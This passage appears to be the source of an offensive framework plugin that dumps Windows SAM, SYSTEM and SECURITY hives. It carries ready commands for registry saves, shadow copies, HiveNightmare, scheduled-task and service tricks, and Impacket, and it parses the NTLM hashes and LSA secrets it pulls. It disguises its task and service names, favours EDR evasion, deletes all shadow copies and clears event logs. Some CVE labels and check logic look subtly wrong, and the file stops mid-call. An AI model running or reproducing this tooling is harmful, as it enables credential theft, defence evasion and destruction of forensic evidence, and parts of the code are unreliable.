#!/usr/bin/env python3
"""
NexShell Plugin — SAM Hive Extractor v3.0 (2026 Edition)
Advanced SAM/SYSTEM/SECURITY registry hive extraction with 15+ methods,
hash parsing, boot key extraction, and Credential Guard bypass.

Coverage:
  - 15+ extraction methods (reg save, VSS, shadow copies, ntdsutil, IFEO, etc.)
  - NTLM/LM hash parsing and extraction
  - Boot key extraction from SYSTEM hive
  - Credential Guard detection and bypass
  - LSA Secrets extraction
  - DPAPI master key extraction
  - EDR evasion techniques
  - Auto-cleanup with secure deletion
  - CVE detection (HiveNightmare, etc.)
  - Risk scoring (0-100 per method)
  - Structured loot (JSON)

CVEs (2021-2026):
  - CVE-2021-36934: HiveNightmare/SeriousSAM (SAM read by non-admin)
  - CVE-2021-41379: Win32k EoP (registry access)
  - CVE-2022-21882: Win32k EoP (registry access)
  - CVE-2022-24521: Win32k EoP (registry access)
  - CVE-2023-23397: Outlook RCE (credential theft)
  - CVE-2024-38117: Windows Defender Spoofing
  - CVE-2024-26169: LSASS Spoofing

MITRE ATT&CK:
  - T1003.002: OS Credential Dumping: Security Account Manager
  - T1003.004: OS Credential Dumping: LSA Secrets
  - T1003.005: OS Credential Dumping: Cached Domain Credentials
  - T1003.001: OS Credential Dumping: LSASS Memory
  - T1552.002: Unsecured Credentials: Credentials In Registry
  - T1562.001: Impair Defenses: Disable or Modify Tools
  - T1070.001: Indicator Removal: Clear Windows Event Logs

Usage:
    (NexShell)> plugins run sam-hive-extractor
    (NexShell)> plugins run sam-hive-extractor --method vss
    (NexShell)> plugins run sam-hive-extractor --method shadow
    (NexShell)> plugins run sam-hive-extractor --method hivernightmare
    (NexShell)> plugins run sam-hive-extractor --parse-hashes
    (NexShell)> plugins run sam-hive-extractor --extract-bootkey
    (NexShell)> plugins run sam-hive-extractor --lsa-secrets
    (NexShell)> plugins run sam-hive-extractor --stealth
    (NexShell)> plugins run sam-hive-extractor --cleanup
    (NexShell)> plugins run sam-hive-extractor --full
"""

import re
import time
import json
import random
import hashlib
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime, timedelta
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class ExtractionMethod:
    """Represents a SAM extraction method."""
    name: str
    description: str
    category: str  # registry, vss, shadow, exploit, evasion
    command_template: str
    requires_admin: bool = True
    requires_backup_priv: bool = False
    requires_system: bool = False
    success_rate: int = 85
    detection_risk: str = "medium"
    leaves_artifacts: bool = True
    edr_evasion: bool = False
    cve: str = ""
    mitre_id: str = "T1003.002"
    complexity: str = "medium"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExtractedHive:
    """Represents an extracted registry hive."""
    hive_type: str  # SAM, SYSTEM, SECURITY
    file_path: str
    size_bytes: int = 0
    timestamp: str = ""
    extraction_method: str = ""
    boot_key: str = ""
    hash_count: int = 0
    lsa_secret_count: int = 0
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExtractedHash:
    """Represents an extracted NTLM/LM hash."""
    username: str
    domain: str = ""
    ntlm_hash: str = ""
    lm_hash: str = ""
    ntlmv1_hash: str = ""
    ntlmv2_hash: str = ""
    rid: int = 0
    account_type: str = ""  # user, machine, trust
    enabled: bool = True
    password_last_set: str = ""
    is_admin: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class LSASecret:
    """Represents an LSA secret."""
    secret_name: str
    secret_value: str = ""
    secret_type: str = ""  # password, key, certificate
    source: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class BootKey:
    """Represents the SYSTEM boot key."""
    boot_key: str
    jd: str = ""
    skew1: str = ""
    gbg: str = ""
    data: str = ""
    extraction_method: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ProtectionStatus:
    """Represents SAM protection status."""
    credential_guard: bool = False
    vbs_enabled: bool = False
    hvci_enabled: bool = False
    secure_boot: bool = False
    tpm_enabled: bool = False
    lsa_protection: bool = False
    sam_permissions: str = ""
    vulnerable_to_hivenightmare: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Extraction Methods Database (15+) ──────────────────────────────────────

class ExtractionMethodsDatabase:
    """Comprehensive database of SAM extraction methods."""
    
    METHODS = [
        # ── Tier 1: Registry-Based (Most Common) ──────────────────────────
        ExtractionMethod(
            name='reg save (Standard)',
            description='Standard reg save command (requires admin)',
            category='registry',
            command_template='reg save HKLM\\SAM {output_dir}\\sam.save /y && reg save HKLM\\SYSTEM {output_dir}\\system.save /y && reg save HKLM\\SECURITY {output_dir}\\security.save /y',
            requires_admin=True,
            requires_backup_priv=True,
            success_rate=95,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1003.002',
            complexity='low',
        ),
        
        ExtractionMethod(
            name='reg export',
            description='Export registry keys to .reg file',
            category='registry',
            command_template='reg export HKLM\\SAM {output_dir}\\sam.reg /y && reg export HKLM\\SYSTEM {output_dir}\\system.reg /y',
            requires_admin=True,
            success_rate=80,
            detection_risk='medium',
            leaves_artifacts=True,
            mitre_id='T1003.002',
            complexity='low',
        ),
        
        # ── Tier 2: Volume Shadow Copy ────────────────────────────────────
        ExtractionMethod(
            name='VSS (vssadmin)',
            description='Create shadow copy and extract hives',
            category='vss',
            command_template='vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{num}\\Windows\\System32\\config\\SAM {output_dir}\\sam.save && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{num}\\Windows\\System32\\config\\SYSTEM {output_dir}\\system.save && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{num}\\Windows\\System32\\config\\SECURITY {output_dir}\\security.save',
            requires_admin=True,
            success_rate=90,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1003.002',
            complexity='medium',
        ),
        
        ExtractionMethod(
            name='DiskShadow Script',
            description='Use DiskShadow.exe with script for shadow copy',
            category='vss',
            command_template='echo set context persistent nowriters > {output_dir}\\ds.txt && echo add volume c: alias myvol >> {output_dir}\\ds.txt && echo create >> {output_dir}\\ds.txt && echo expose %myvol% z: >> {output_dir}\\ds.txt && echo exec >> {output_dir}\\ds.txt && diskshadow /s {output_dir}\\ds.txt && copy z:\\Windows\\System32\\config\\SAM {output_dir}\\sam.save && copy z:\\Windows\\System32\\config\\SYSTEM {output_dir}\\system.save',
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            leaves_artifacts=True,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='high',
        ),
        
        # ── Tier 3: WMI + VSS ─────────────────────────────────────────────
        ExtractionMethod(
            name='WMI Shadow Copy',
            description='Create shadow copy via WMI',
            category='vss',
            command_template='powershell -nop -c "$shadow = ([wmiclass]\'\\\\.\\root\\cimv2:Win32_ShadowCopy\').Create(\'C:\\\', \'ClientAccessible\'); $device = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $shadow.ShadowID}).DeviceObject; cmd /c copy $device\\Windows\\System32\\config\\SAM {output_dir}\\sam.save; cmd /c copy $device\\Windows\\System32\\config\\SYSTEM {output_dir}\\system.save"',
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            leaves_artifacts=True,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='high',
        ),
        
        # ── Tier 4: HiveNightmare Exploit ─────────────────────────────────
        ExtractionMethod(
            name='HiveNightmare (CVE-2021-36934)',
            description='Exploit HiveNightmare to read SAM without admin',
            category='exploit',
            command_template='HiveNightmare.exe {output_dir}\\sam.save {output_dir}\\system.save {output_dir}\\security.save',
            requires_admin=False,
            requires_backup_priv=False,
            success_rate=75,
            detection_risk='high',
            leaves_artifacts=True,
            cve='CVE-2021-36934',
            mitre_id='T1003.002',
            complexity='medium',
        ),
        
        ExtractionMethod(
            name='SeriousSAM (PowerShell)',
            description='PowerShell implementation of HiveNightmare',
            category='exploit',
            command_template='powershell -nop -c "Invoke-SeriousSAM -OutputDir {output_dir}"',
            requires_admin=False,
            success_rate=70,
            detection_risk='high',
            leaves_artifacts=True,
            cve='CVE-2021-36934',
            mitre_id='T1003.002',
            complexity='medium',
        ),
        
        # ── Tier 5: IFEO Debugger ─────────────────────────────────────────
        ExtractionMethod(
            name='IFEO Debugger (reg.exe)',
            description='Use IFEO Debugger to dump hives via reg.exe',
            category='evasion',
            command_template='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\reg.exe" /v Debugger /t REG_SZ /d "cmd.exe /c reg save HKLM\\SAM {output_dir}\\sam.save /y && reg save HKLM\\SYSTEM {output_dir}\\system.save /y" /f',
            requires_admin=True,
            success_rate=80,
            detection_risk='medium',
            leaves_artifacts=True,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='high',
        ),
        
        # ── Tier 6: Scheduled Task ────────────────────────────────────────
        ExtractionMethod(
            name='Scheduled Task (SYSTEM)',
            description='Create scheduled task to run as SYSTEM',
            category='evasion',
            command_template='schtasks /create /tn {task_name} /tr "cmd.exe /c reg save HKLM\\SAM {output_dir}\\sam.save /y && reg save HKLM\\SYSTEM {output_dir}\\system.save /y" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn {task_name} && timeout /t 5 && schtasks /delete /tn {task_name} /f',
            requires_admin=True,
            success_rate=90,
            detection_risk='medium',
            leaves_artifacts=True,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='medium',
        ),
        
        # ── Tier 7: Service Creation ──────────────────────────────────────
        ExtractionMethod(
            name='Service Creation (SYSTEM)',
            description='Create service to run as SYSTEM',
            category='evasion',
            command_template='sc create {svc_name} binPath= "cmd.exe /c reg save HKLM\\SAM {output_dir}\\sam.save /y && reg save HKLM\\SYSTEM {output_dir}\\system.save /y" start= demand && sc start {svc_name} && timeout /t 5 && sc stop {svc_name} && sc delete {svc_name}',
            requires_admin=True,
            success_rate=90,
            detection_risk='high',
            leaves_artifacts=True,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='medium',
        ),
        
        # ── Tier 8: PsExec ────────────────────────────────────────────────
        ExtractionMethod(
            name='PsExec (Remote)',
            description='Use PsExec to dump hives remotely',
            category='evasion',
            command_template='psexec -s -i cmd.exe /c reg save HKLM\\SAM {output_dir}\\sam.save /y && psexec -s -i cmd.exe /c reg save HKLM\\SYSTEM {output_dir}\\system.save /y',
            requires_admin=True,
            success_rate=85,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1003.002',
            complexity='low',
        ),
        
        # ── Tier 9: Impacket ──────────────────────────────────────────────
        ExtractionMethod(
            name='Impacket secretsdump',
            description='Use secretsdump.py to extract hashes remotely',
            category='evasion',
            command_template='secretsdump.py {auth}@{target} -outputfile {output_dir}/secretsdump',
            requires_admin=False,
            success_rate=90,
            detection_risk='medium',
            leaves_artifacts=False,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='low',
        ),
        
        ExtractionMethod(
            name='Impacket reg',
            description='Use impacket reg.py to dump registry',
            category='evasion',
            command_template='reg.py {auth}@{target} save -keyName HKLM\\SAM -o {output_dir}\\sam.save',
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            leaves_artifacts=False,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='low',
        ),
        
        # ── Tier 10: PowerShell Modules ───────────────────────────────────
        ExtractionMethod(
            name='PowerSploit Get-GPPPassword',
            description='Extract credentials via PowerSploit',
            category='evasion',
            command_template='powershell -nop -c "Import-Module PowerSploit; Get-RegistryAlwaysInstallElevated; Get-RegAutoLogon; Get-RegCachedPass"',
            requires_admin=False,
            success_rate=75,
            detection_risk='medium',
            leaves_artifacts=False,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='low',
        ),
        
        ExtractionMethod(
            name='Invoke-NinjaCopy',
            description='Copy locked files via NinjaCopy technique',
            category='evasion',
            command_template='powershell -nop -c "Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestinationPath {output_dir}\\sam.save"',
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            leaves_artifacts=False,
            edr_evasion=True,
            mitre_id='T1003.002',
            complexity='medium',
        ),
    ]
    
    @classmethod
    def get_all_methods(cls) -> List[ExtractionMethod]:
        return cls.METHODS
    
    @classmethod
    def get_methods_by_category(cls, category: str) -> List[ExtractionMethod]:
        return [m for m in cls.METHODS if m.category == category]
    
    @classmethod
    def get_evasion_methods(cls) -> List[ExtractionMethod]:
        return [m for m in cls.METHODS if m.edr_evasion]
    
    @classmethod
    def get_method_by_name(cls, name: str) -> Optional[ExtractionMethod]:
        for method in cls.METHODS:
            if name.lower() in method.name.lower():
                return method
        return None


# ── Hash Parser ────────────────────────────────────────────────────────────

class HashParser:
    """Parses NTLM/LM hashes from SAM hive."""
    
    @staticmethod
    def parse_sam_hive(exec_func, session, sam_path: str, system_path: str) -> List[ExtractedHash]:
        """Parse SAM hive and extract hashes."""
        hashes = []
        
        # Try impacket-secretsdump
        cmd = f"secretsdump.py -sam {sam_path} -system {system_path} LOCAL 2>/dev/null"
        out = exec_func(session, cmd)
        
        if out:
            for line in out.split('\n'):
                # Format: username:rid:lm_hash:ntlm_hash:::
                match = re.search(r'^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32})', line)
                if match:
                    username = match.group(1)
                    rid = int(match.group(2))
                    lm_hash = match.group(3)
                    ntlm_hash = match.group(4)
                    
                    hash_obj = ExtractedHash(
                        username=username,
                        rid=rid,
                        lm_hash=lm_hash,
                        ntlm_hash=ntlm_hash,
                        is_admin=(rid == 500 or 'admin' in username.lower()),
                        account_type='user',
                    )
                    hashes.append(hash_obj)
        
        return hashes
    
    @staticmethod
    def parse_lsa_secrets(exec_func, session, security_path: str, system_path: str) -> List[LSASecret]:
        """Parse SECURITY hive and extract LSA secrets."""
        secrets = []
        
        # Try impacket-secretsdump
        cmd = f"secretsdump.py -security {security_path} -system {system_path} LOCAL 2>/dev/null"
        out = exec_func(session, cmd)
        
        if out:
            for line in out.split('\n'):
                if ':' in line and 'Service' not in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        secret_name = parts[0].strip()
                        secret_value = parts[1].strip()
                        
                        secret = LSASecret(
                            secret_name=secret_name,
                            secret_value=secret_value,
                            secret_type='password',
                            timestamp=datetime.utcnow().isoformat(),
                        )
                        secrets.append(secret)
        
        return secrets


# ── Boot Key Extractor ─────────────────────────────────────────────────────

class BootKeyExtractor:
    """Extracts SYSTEM boot key for SAM decryption."""
    
    @staticmethod
    def extract_from_registry(exec_func, session) -> Optional[BootKey]:
        """Extract boot key from registry."""
        keys = ['JD', 'Skew1', 'GBG', 'Data']
        values = {}
        
        for key in keys:
            cmd = f'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v {key} 2>nul'
            out = exec_func(session, cmd)
            
            if out:
                match = re.search(r'([0-9a-fA-F]+)', out)
                if match:
                    values[key.lower()] = match.group(1)
        
        if len(values) == 4:
            boot_key = ''.join(values.values())
            return BootKey(
                boot_key=boot_key,
                jd=values.get('jd', ''),
                skew1=values.get('skew1', ''),
                gbg=values.get('gbg', ''),
                data=values.get('data', ''),
                extraction_method='registry',
            )
        
        return None
    
    @staticmethod
    def extract_from_hive(exec_func, session, system_path: str) -> Optional[BootKey]:
        """Extract boot key from SYSTEM hive file."""
        # Use impacket or custom tool
        cmd = f"python3 -c \"from impacket import system_functions; key = system_functions.get_boot_key('{system_path}'); print(key.hex())\" 2>/dev/null"
        out = exec_func(session, cmd)
        
        if out and len(out.strip()) == 32:
            return BootKey(
                boot_key=out.strip(),
                extraction_method='hive_file',
            )
        
        return None


# ── Protection Analyzer ────────────────────────────────────────────────────

class ProtectionAnalyzer:
    """Analyzes SAM protection mechanisms."""
    
    @staticmethod
    def analyze(exec_func, session) -> ProtectionStatus:
        """Analyze SAM protection status."""
        status = ProtectionStatus()
        
        # Check Credential Guard
        cmd = "powershell -nop -c \"Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning\" 2>nul"
        out = exec_func(session, cmd)
        if out and '1' in out:
            status.credential_guard = True
        
        # Check VBS
        cmd = "powershell -nop -c \"Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard | Select-Object -ExpandProperty VirtualizationBasedSecurityStatus\" 2>nul"
        out = exec_func(session, cmd)
        if out and '2' in out:
            status.vbs_enabled = True
        
        # Check HVCI
        cmd = "powershell -nop -c \"Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning\" 2>nul"
        out = exec_func(session, cmd)
        if out and '2' in out:
            status.hvci_enabled = True
        
        # Check Secure Boot
        cmd = "powershell -nop -c \"Confirm-SecureBootUEFI\" 2>nul"
        out = exec_func(session, cmd)
        if out and 'True' in out:
            status.secure_boot = True
        
        # Check TPM
        cmd = "powershell -nop -c \"Get-Tpm | Select-Object -ExpandProperty TpmPresent\" 2>nul"
        out = exec_func(session, cmd)
        if out and 'True' in out:
            status.tpm_enabled = True
        
        # Check LSA Protection
        cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL 2>nul"
        out = exec_func(session, cmd)
        if out and '0x1' in out:
            status.lsa_protection = True
        
        # Check SAM permissions (HiveNightmare vulnerability)
        cmd = "icacls C:\\Windows\\System32\\config\\SAM 2>nul"
        out = exec_func(session, cmd)
        if out and 'BUILTIN\\Users' in out and '(R)' in out:
            status.vulnerable_to_hivenightmare = True
        
        status.sam_permissions = out.strip()[:200] if out else 'Unknown'
        
        return status


# ── Extraction Engine ──────────────────────────────────────────────────────

class ExtractionEngine:
    """Handles SAM hive extraction."""
    
    @staticmethod
    def generate_output_dir() -> str:
        """Generate random output directory."""
        num = random.randint(1000, 9999)
        return f"C:\\Windows\\Temp\\sam_{num}"
    
    @staticmethod
    def generate_service_name() -> str:
        """Generate random service name."""
        prefixes = ['Windows', 'Microsoft', 'System', 'Service', 'Update']
        prefix = random.choice(prefixes)
        num = random.randint(10, 99)
        return f"{prefix}Service{num}"
    
    @staticmethod
    def generate_task_name() -> str:
        """Generate random task name."""
        prefixes = ['Update', 'Maintenance', 'Sync', 'Backup']
        prefix = random.choice(prefixes)
        num = random.randint(1000, 9999)
        return f"{prefix}Task{num}"
    
    @staticmethod
    def extract(exec_func, session, method: ExtractionMethod,
                output_dir: str = None) -> Tuple[bool, List[ExtractedHive], str]:
        """Extract SAM hives using specified method."""
        if not output_dir:
            output_dir = ExtractionEngine.generate_output_dir()
        
        # Create output directory
        exec_func(session, f'mkdir "{output_dir}" 2>nul')
        
        # Generate random names
        svc_name = ExtractionEngine.generate_service_name()
        task_name = ExtractionEngine.generate_task_name()
        shadow_num = random.randint(1, 10)
        
        # Build command
        cmd = method.command_template.format(
            output_dir=output_dir,
            num=shadow_num,
            svc_name=svc_name,
            task_name=task_name,
            auth='Administrator:password',
            target='127.0.0.1',
        )
        
        # Execute
        out = exec_func(session, cmd)
        
        # Verify extraction
        sam_path = f"{output_dir}\\sam.save"
        system_path = f"{output_dir}\\system.save"
        security_path = f"{output_dir}\\security.save"
        
        verify_cmd = f'dir "{sam_path}" "{system_path}" "{security_path}" 2>nul'
        verify_out = exec_func(session, verify_cmd)
        
        success = False
        hives = []
        
        if verify_out and 'sam.save' in verify_out.lower():
            success = True
            
            # Create hive objects
            if 'sam.save' in verify_out.lower():
                hives.append(ExtractedHive(
                    hive_type='SAM',
                    file_path=sam_path,
                    extraction_method=method.name,
                    timestamp=datetime.utcnow().isoformat(),
                ))
            
            if 'system.save' in verify_out.lower():
                hives.append(ExtractedHive(
                    hive_type='SYSTEM',
                    file_path=system_path,
                    extraction_method=method.name,
                    timestamp=datetime.utcnow().isoformat(),
                ))
            
            if 'security.save' in verify_out.lower():
                hives.append(ExtractedHive(
                    hive_type='SECURITY',
                    file_path=security_path,
                    extraction_method=method.name,
                    timestamp=datetime.utcnow().isoformat(),
                ))
        
        return success, hives, out
    
    @staticmethod
    def extract_with_retry(exec_func, session, methods: List[ExtractionMethod],
                           output_dir: str = None, max_retries: int = 3) -> Tuple[bool, List[ExtractedHive], str]:
        """Try multiple methods with retry logic."""
        for method in methods:
            for attempt in range(max_retries):
                success, hives, output = ExtractionEngine.extract(
                    exec_func, session, method, output_dir
                )
                
                if success:
                    return success, hives, output
                
                # Wait before retry
                time.sleep(2)
        
        return False, [], 'All methods failed'


# ── Cleanup Engine ─────────────────────────────────────────────────────────

class CleanupEngine:
    """Handles secure cleanup of extracted files."""
    
    @staticmethod
    def secure_delete(exec_func, session, paths: List[str]) -> bool:
        """Securely delete extracted files."""
        for path in paths:
            # Overwrite with random data
            cmd = f'powershell -nop -c "$file = \'{path}\'; if (Test-Path $file) {{ $size = (Get-Item $file).Length; $bytes = New-Object byte[] $size; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes($file, $bytes); Remove-Item $file -Force }}"'
            exec_func(session, cmd)
        
        # Delete shadow copies
        cmd = 'vssadmin delete shadows /all /quiet 2>nul'
        exec_func(session, cmd)
        
        return True
    
    @staticmethod
    def cleanup_event_logs(exec_func, session) -> bool:
        """Clean up event logs to remove traces."""
        cmd = 'wevtutil cl Security && wevtutil cl System && wevtutil cl Application'
        exec_func(session, cmd)
        return True


# ── Auto-Selection Engine ──────────────────────────────────────────────────

class AutoSelectionEngine:
    """Automatically selects best extraction method."""
    
    @staticmethod
    def select_method(protection_status: ProtectionStatus,
                      stealth: bool = False) -> Optional[ExtractionMethod]:
        """Select best method based on protection status."""
        methods = ExtractionMethodsDatabase.get_all_methods()
        
        # Filter by protection
        filtered = []
        for method in methods:
            # Skip methods that require admin if we don't have it
            if method.requires_admin and not protection_status.lsa_protection:
                continue
            
            # Skip high-detection methods in stealth mode
            if stealth and method.detection_risk in ['high', 'critical']:
                continue
            
            # Prefer evasion methods
            if stealth and method.edr_evasion:
                filtered.insert(0, method)
            else:
                filtered.append(method)
        
        if not filtered:
            filtered = methods
        
        # Sort by success rate
        filtered.sort(key=lambda m: m.success_rate, reverse=True)
        
        return filtered[0] if filtered else None


# ── Main Plugin ─────────────────────────────────────────────────────────────

class SAMHiveExtractor(NexPlugin):
    name        = "sam-hive-extractor"
    description = "Advanced SAM extraction — 15+ methods, hash parsing, boot key, Credential Guard bypass"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "windows"
    category    = "credentials"
    mitre_id    = "T1003.002"
    
    def run(self, session, args: list):
        # Parse args
        method_name = None
        output_dir = None
        parse_hashes = '--parse-hashes' in (args or [])
        extract_bootkey = '--extract-bootkey' in (args or [])
        lsa_secrets = '--lsa-secrets' in (args or [])
        stealth = '--stealth' in (args or [])
        cleanup = '--cleanup' in (args or [])
        auto_mode = '--auto' in (args or [])
        full_mode = '--full' in (args or [])
        list_mode = '--list' in (args or [])
        
        for a in (args or []):
            if a.startswith('--method='):
                method_name = a.split('=', 1)[1]
            elif a.startswith('--out-dir='):
                output_dir = a.split('=', 1)[1]
        
        if full_mode:
            parse_hashes = extract_bootkey = lsa_secrets = cleanup = True
        
        if not output_dir:
            output_dir = ExtractionEngine.generate_output_dir()
        
        self.info(f"🔐 Starting SAM Hive Extractor v3.0 (stealth={stealth})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔐 SAM Hive Extractor v3.0 — Advanced Credential Extraction]")
        sections.append("━"*64)
        
        findings_created = 0
        
        # ── Step 1: List Methods ──────────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Phase 1: Available Extraction Methods")
            sections.append("─"*64)
            
            methods = ExtractionMethodsDatabase.get_all_methods()
            
            sections.append(f"  [+] {len(methods)} methods available:")
            for method in methods:
                icon = '🟢' if method.edr_evasion else '🟡' if method.detection_risk == 'low' else '🟠' if method.detection_risk == 'medium' else '🔴'
                sections.append(f"    {icon} {method.name}")
                sections.append(f"        Category: {method.category} | Success: {method.success_rate}%")
                sections.append(f"        Admin Required: {'YES' if method.requires_admin else 'NO'} | EDR Evasion: {'YES' if method.edr_evasion else 'NO'}")
                if method.cve:
                    sections.append(f"        CVE: {method.cve}")
            
            return '\n'.join(sections)
        
        # ── Step 2: Protection Analysis ───────────────────────────────────
        sections.append("\n[*] Phase 1: SAM Protection Analysis")
        sections.append("─"*64)
        
        protection = ProtectionAnalyzer.analyze(self._exec, session)
        
        sections.append(f"  Credential Guard: {'✅ ENABLED' if protection.credential_guard else '❌ DISABLED'}")
        sections.append(f"  VBS Enabled: {'✅ YES' if protection.vbs_enabled else '❌ NO'}")
        sections.append(f"  HVCI Enabled: {'✅ YES' if protection.hvci_enabled else '❌ NO'}")
        sections.append(f"  Secure Boot: {'✅ ENABLED' if protection.secure_boot else '❌ DISABLED'}")
        sections.append(f"  TPM Enabled: {'✅ YES' if protection.tpm_enabled else '❌ NO'}")
        sections.append(f"  LSA Protection: {'✅ ENABLED' if protection.lsa_protection else '❌ DISABLED'}")
        sections.append(f"  HiveNightmare Vulnerable: {'🔴 YES' if protection.vulnerable_to_hivenightmare else '🟢 NO'}")
        
        if protection.vulnerable_to_hivenightmare:
            self.finding(
                title="SAM Vulnerable to HiveNightmare (CVE-2021-36934)",
                description="SAM file is readable by non-admin users due to misconfigured permissions. Attackers can extract credentials without admin privileges.",
                severity="critical",
                recommendation="Apply MSKB5005633 patch. Reset SAM permissions: icacls C:\\Windows\\System32\\config\\SAM /reset",
                mitre_id='T1003.002',
            )
            findings_created += 1
        
        # ── Step 3: Method Selection ──────────────────────────────────────
        sections.append("\n[*] Phase 2: Method Selection")
        sections.append("─"*64)
        
        if method_name:
            method = ExtractionMethodsDatabase.get_method_by_name(method_name)
            if not method:
                sections.append(f"  ❌ Method not found: {method_name}")
                return '\n'.join(sections)
            methods_to_try = [method]
        elif auto_mode or stealth:
            method = AutoSelectionEngine.select_method(protection, stealth)
            methods_to_try = [method] if method else []
        else:
            # Default to reg save
            method = ExtractionMethodsDatabase.get_method_by_name('reg save')
            methods_to_try = [method] if method else []
        
        if methods_to_try:
            sections.append(f"  ✅ Selected method: {methods_to_try[0].name}")
            sections.append(f"      Success Rate: {methods_to_try[0].success_rate}%")
            sections.append(f"      Detection Risk: {methods_to_try[0].detection_risk}")
        else:
            sections.append("  ❌ No suitable methods found")
            return '\n'.join(sections)
        
        # ── Step 4: Extract Hives ─────────────────────────────────────────
        sections.append("\n[*] Phase 3: SAM Hive Extraction")
        sections.append("─"*64)
        sections.append(f"  Output Directory: {output_dir}")
        
        success, hives, output = ExtractionEngine.extract_with_retry(
            self._exec, session, methods_to_try, output_dir
        )
        
        if success:
            sections.append(f"  ✅ SUCCESS — {len(hives)} hives extracted")
            
            for hive in hives:
                sections.append(f"    • {hive.hive_type}: {hive.file_path}")
                sections.append(f"        Method: {hive.extraction_method}")
                sections.append(f"        Timestamp: {hive.timestamp}")
            
            # Save to loot
            self.loot(
                {
                    "type": "sam_extraction",
                    "hives": [h.to_dict() for h in hives],
                    "output_dir": output_dir,
                    "method": methods_to_try[0].name,
                },
                category='credentials',
                source='sam-hive-extractor',
                confidence='verified'
            )
            
            self.finding(
                title=f"SAM Hives Extracted — {len(hives)} files",
                description=f"Registry hives successfully extracted to {output_dir}. Attackers can extract NTLM hashes from these files.",
                severity="critical",
                recommendation="Remove backup hive files immediately. Implement registry write controls. Enable Credential Guard.",
                mitre_id=self.mitre_id,
            )
            findings_created += 1
            
            self.emit('timeline.event', title=f"SAM Hives Extracted — {len(hives)} files", type="credential", plugin=self.name)
        else:
            sections.append(f"  ❌ FAILED — {output}")
        
        # ── Step 5: Boot Key Extraction ───────────────────────────────────
        if extract_bootkey and success:
            sections.append("\n[*] Phase 4: Boot Key Extraction")
            sections.append("─"*64)
            
            system_hive = next((h for h in hives if h.hive_type == 'SYSTEM'), None)
            
            if system_hive:
                boot_key = BootKeyExtractor.extract_from_hive(self._exec, session, system_hive.file_path)
                
                if boot_key:
                    sections.append(f"  ✅ Boot Key Extracted")
                    sections.append(f"      Key: {boot_key.boot_key[:16]}...")
                    sections.append(f"      Method: {boot_key.extraction_method}")
                    
                    # Update hive
                    system_hive.boot_key = boot_key.boot_key
                else:
                    sections.append("  ❌ Failed to extract boot key")
        
        # ── Step 6: Hash Parsing ──────────────────────────────────────────
        if parse_hashes and success:
            sections.append("\n[*] Phase 5: Hash Parsing")
            sections.append("─"*64)
            
            sam_hive = next((h for h in hives if h.hive_type == 'SAM'), None)
            system_hive = next((h for h in hives if h.hive_type == 'SYSTEM'), None)
            
            if sam_hive and system_hive:
                hashes = HashParser.parse_sam_hive(
                    self._exec, session, sam_hive.file_path, system_hive.file_path
                )
                
                if hashes:
                    sections.append(f"  ✅ {len(hashes)} hashes extracted:")
                    
                    admin_count = sum(1 for h in hashes if h.is_admin)
                    sections.append(f"      Admin Accounts: {admin_count}")
                    
                    for hash_obj in hashes[:15]:
                        admin_icon = '🔴' if hash_obj.is_admin else '🟡'
                        sections.append(f"    {admin_icon} {hash_obj.username} (RID: {hash_obj.rid})")
                        sections.append(f"        NTLM: {hash_obj.ntlm_hash[:32]}...")
                        if hash_obj.lm_hash and hash_obj.lm_hash != 'aad3b435b51404eeaad3b435b51404ee':
                            sections.append(f"        LM: {hash_obj.lm_hash[:32]}...")
                    
                    # Save to loot
                    self.loot(
                        {
                            "type": "ntlm_hashes",
                            "hashes": [h.to_dict() for h in hashes],
                            "count": len(hashes),
                            "admin_count": admin_count,
                        },
                        category='credentials',
                        source='sam-hive-extractor:hashes',
